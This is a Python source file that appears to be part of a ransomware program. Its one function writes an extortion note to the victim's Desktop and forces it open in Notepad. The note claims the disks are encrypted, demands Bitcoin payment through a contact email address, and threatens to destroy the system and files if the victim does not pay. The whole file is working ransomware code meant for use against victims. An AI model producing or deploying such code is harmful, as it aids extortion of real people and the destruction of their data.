# Status - OK
import os
from subprocess import Popen
import win32gui

def display_ransom_note():
        
        filePath = os.path.expanduser("~\\Desktop") + "\\@README.txt"
        with open(filePath, 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
IF PAYMENT IF NOT MADE ON TIME, WE WILL BRICK YOUR ENTIRE SYSTEM.
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')
        print(filePath)
        proc = Popen(["notepad.exe", filePath])   

        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window) 

        if title == "@README - Notepad":
              print("On Top")
        else:
              proc.kill()
              Popen(["notepad.exe", filePath])


